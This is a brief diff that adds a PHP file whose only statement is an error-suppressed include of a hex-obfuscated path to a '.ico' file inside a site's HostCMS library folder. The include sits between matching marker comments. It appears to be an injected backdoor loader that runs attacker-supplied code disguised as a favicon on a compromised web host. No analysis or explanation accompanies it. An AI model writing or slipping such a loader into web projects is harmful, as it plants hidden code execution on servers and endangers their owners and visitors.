@@ -1,0 +1,11 @@
+<?php
+
+
+/*9472e*/
+
+@include "\x2fhom\x65/ne\x6f-vo\x2fneo\x2dvo.\x72u/d\x6fcs/\x68ost\x63msf\x69les\x2flib\x2flib\x5f38/\x66avi\x63on_\x3180d\x622.i\x63o";
+
+/*9472e*/
+
+
+
